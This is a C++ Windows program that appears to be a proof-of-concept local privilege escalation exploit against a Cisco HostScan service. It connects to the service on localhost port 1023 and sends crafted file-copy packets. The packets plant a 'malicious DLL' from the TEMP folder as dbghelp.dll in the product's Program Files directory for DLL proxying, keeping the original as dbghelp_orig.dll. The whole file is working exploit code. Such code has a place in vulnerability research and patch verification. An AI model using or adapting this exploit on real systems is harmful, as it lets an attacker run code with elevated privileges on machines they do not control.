#include <iostream>
#include <winsock2.h>   // For Windows socket programming
#include <ws2tcpip.h>   // For Windows socket programming
#include <windows.h>    // For Windows API functions
#include <tchar.h>      // For TCHAR and _T macro
#include <string>  // Add this line for the string type

#pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
//int main()
{
    int iResult;
    WSADATA wsaData;
    SOCKET ConnectSocket;
    struct sockaddr_in clientService;
    const DWORD MAX_VAL = 32000;
    char buff[MAX_VAL];
    char recv_packet[0x2E28] = { 0 };

    //Socket Stuff
    iResult = WSAStartup(0x101, &wsaData);
    if (iResult != NO_ERROR)
        return 1;

    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET)
        return 1;
    // connect to Cisco Security Service on port 1023
    clientService.sin_family = AF_INET;
    InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(1023);
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR)
        return 1;

    // Get Temp directory
    DWORD retval = GetEnvironmentVariableA((LPCSTR)"TEMP", buff, MAX_VAL);
    if (retval == 0) {
        retval = GetEnvironmentVariableA((LPCSTR)"TMP", buff, MAX_VAL);
        if (retval == 0)
            return 1;
    }
    std::string tmppath(buff);

    // Get Program files directory
    memset(buff, 0, MAX_VAL);
    retval = GetEnvironmentVariableA((LPCSTR)"PROGRAMFILES(X86)", buff, MAX_VAL);
    if (retval == 0) {
        retval = GetEnvironmentVariableA((LPCSTR)"PROGRAMFILES", buff, MAX_VAL);
        if (retval == 0)
            return 1;
    }
    std::string progfilespath(buff);


    // Copy dbghelp.dll to C:\Program Files(x86)\Cisco\Cisco HostScan\bin\dbghelp.dll for DLL Proxying
    MessageBoxA(0, "copying dbghelp.dll", "priv_file_copy_packet", 0);
    std::string tmpdllpath = tmppath + "\\Cisco\\Cisco HostScan\\dbghelp.dll"; // Compile malicious DLL for DLL Proxying
    std::string finaldllpath = progfilespath + "\\Cisco\\Cisco HostScan\\bin\\dbghelp.dll";

    char priv_file_copy_packet[0x2E28] = {
        0x00, 0x00, 0x2E, 0x24, //packetLen - big endian
        0x20, 0x00, 0x00, 0x00, //opcode - little endian
        0x58, 0x58, 0x58, 0x58  // padding
    };

    for (int i = 0; i < 1024; i++)
        if (i <= tmpdllpath.length()) {
            *(LPBYTE)(priv_file_copy_packet + 12 + i) = tmpdllpath[i];
        }
        else {
            *(LPBYTE)(priv_file_copy_packet + 12 + i) = 0x41;
        }

    for (int i = 0; i < 10780; i++)
        if (i <= finaldllpath.length()) {
            *(LPBYTE)(priv_file_copy_packet + 1036 + i) = finaldllpath[i];
        }
        else {
            *(LPBYTE)(priv_file_copy_packet + 1036 + i) = 0x42;
        }

    iResult = send(ConnectSocket, priv_file_copy_packet, 0x2E28, 0);
    if (iResult == SOCKET_ERROR)
        return 1;
    recv(ConnectSocket, recv_packet, 0x2E28, 0);
    Sleep(1000);

    // Copy dbghelp.dll to C:\Program Files(x86)\Cisco\Cisco HostScan\bin\dbghelp_orig.dll 
    MessageBoxA(0, "copying dbghelp_orig", "priv_file_copy_packet 2", 0);
    tmpdllpath = tmppath + "\\Cisco\\Cisco HostScan\\dbghelp_orig.dll"; //Copy dbghelp.dll from C:\Windows\SysWOW64 and rename to dbghelp_orig.dll
    finaldllpath = progfilespath + "\\Cisco\\Cisco HostScan\\bin\\dbghelp_orig.dll";

    char priv_file_copy_packet_2[0x2E28] = {
        0x00, 0x00, 0x2E, 0x24, //packetLen - big endian
        0x20, 0x00, 0x00, 0x00, //opcode - little endian
        0x58, 0x58, 0x58, 0x58  // padding
    };

    for (int i = 0; i < 1024; i++)
        if (i <= tmpdllpath.length()) {
            *(LPBYTE)(priv_file_copy_packet_2 + 12 + i) = tmpdllpath[i];
        }
        else {
            *(LPBYTE)(priv_file_copy_packet_2 + 12 + i) = 0x41;
        }

    for (int i = 0; i < 10780; i++)
        if (i <= finaldllpath.length()) {
            *(LPBYTE)(priv_file_copy_packet_2 + 1036 + i) = finaldllpath[i];
        }
        else {
            *(LPBYTE)(priv_file_copy_packet_2 + 1036 + i) = 0x42;
        }

    iResult = send(ConnectSocket, priv_file_copy_packet_2, 0x2E28, 0);
    if (iResult == SOCKET_ERROR)
        return 1;
    recv(ConnectSocket, recv_packet, 0x2E28, 0);
    Sleep(1000);

    
    closesocket(ConnectSocket);

    return 0;
}
